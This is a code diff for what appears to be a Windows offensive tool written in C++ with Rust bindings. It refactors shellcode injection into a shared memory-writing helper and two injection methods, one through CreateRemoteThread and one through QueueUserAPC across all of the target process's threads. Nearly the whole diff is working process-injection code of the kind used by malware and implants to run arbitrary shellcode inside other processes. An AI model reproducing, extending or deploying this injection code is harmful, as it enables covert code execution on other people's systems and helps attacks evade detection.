@@ -3,7 +3,6 @@
 #include "error.h"
 #include "process.rs.h"
 #include <TlHelp32.h>
-#include <Windows.h>
 #include <optional>
 #include <psapi.h>
 
@@ -96,19 +95,13 @@ Output execute(rust::String command, rust::Vec<rust::String> args) {
   return output;
 }
 
-void inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
-                            rust::u32 ep_offset,
-                            rust::Vec<rust::u8> parameter) {
-  auto process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
-  if (process == nullptr) {
-    throw AppError("failed to open process");
-  }
-
+std::tuple<void * /*remote_shellcode*/, void * /*remote_parameter*/>
+write_process_memory(HANDLE process, rust::Vec<rust::u8> shellcode,
+                     rust::Vec<rust::u8> parameter) {
   auto remote_shellcode =
       VirtualAllocEx(process, NULL, shellcode.size(), MEM_RESERVE | MEM_COMMIT,
                      PAGE_READWRITE);
   if (remote_shellcode == nullptr) {
-    CloseHandle(process);
     throw AppError("failed to allocate memory in remote process");
   }
 
@@ -117,7 +110,6 @@ void inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
                                    shellcode.size(), &written);
   if (status == false) {
     VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
-    CloseHandle(process);
     throw AppError("failed to write shellcode to remote process");
   }
 
@@ -127,7 +119,6 @@ void inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
                             PAGE_EXECUTE_READ, &old);
   if (status == false) {
     VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
-    CloseHandle(process);
     throw AppError("failed to set memory protection");
   }
 
@@ -137,7 +128,6 @@ void inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
                                       MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (remote_parameter == nullptr) {
       VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
-      CloseHandle(process);
       throw AppError("failed to allocate memory in remote process");
     }
 
@@ -146,16 +136,37 @@ void inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
     if (status == false) {
       VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
       VirtualFreeEx(process, remote_parameter, 0, MEM_RELEASE);
-      CloseHandle(process);
       throw AppError("failed to write parameter to remote process");
     }
+  }
+
+  return std::make_tuple(remote_shellcode, remote_parameter);
+}
+
+void inject_shellcode_by_id_rtc(rust::u32 pid, rust::Vec<rust::u8> shellcode,
+                                rust::u32 ep_offset,
+                                rust::Vec<rust::u8> parameter) {
+  auto process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+  if (process == nullptr) {
+    throw AppError("failed to open process");
+  }
+
+  void *remote_shellcode = nullptr;
+  void *remote_parameter = nullptr;
+
+  try {
+    std::tie(remote_shellcode, remote_parameter) =
+        write_process_memory(process, shellcode, parameter);
+  } catch (AppError &e) {
+    CloseHandle(process);
+    throw e;
   }
 
   auto thread = CreateRemoteThread(
       process, nullptr, 0,
       (LPTHREAD_START_ROUTINE)((uintptr_t)remote_shellcode + ep_offset),
       remote_parameter, 0, nullptr);
-  if (status == false) {
+  if (thread == nullptr) {
     VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
     VirtualFreeEx(process, remote_parameter, 0, MEM_RELEASE);
     CloseHandle(process);
@@ -163,6 +174,48 @@ void inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
   }
 
   CloseHandle(thread);
+  CloseHandle(process);
+}
+
+void inject_shellcode_by_id_apc(rust::u32 pid, rust::Vec<rust::u8> shellcode,
+                                rust::u32 ep_offset,
+                                rust::Vec<rust::u8> parameter) {
+  auto process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+  if (process == nullptr) {
+    throw AppError("failed to open process");
+  }
+
+  void *remote_shellcode = nullptr;
+  void *remote_parameter = nullptr;
+
+  try {
+    std::tie(remote_shellcode, remote_parameter) =
+        write_process_memory(process, shellcode, parameter);
+  } catch (AppError &e) {
+    CloseHandle(process);
+    throw e;
+  }
+
+  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+  if (snapshot == INVALID_HANDLE_VALUE) {
+    VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
+    VirtualFreeEx(process, remote_parameter, 0, MEM_RELEASE);
+    CloseHandle(process);
+    throw AppError("failed to create snapshot");
+  }
+
+  THREADENTRY32 te;
+  te.dwSize = sizeof(THREADENTRY32);
+  for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
+    if (te.th32OwnerProcessID == pid) {
+      HANDLE thread = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);
+      QueueUserAPC((PAPCFUNC)((uintptr_t)remote_shellcode + ep_offset), thread,
+                   NULL);
+      CloseHandle(thread);
+    }
+  }
+
+  CloseHandle(snapshot);
   CloseHandle(process);
 }
 
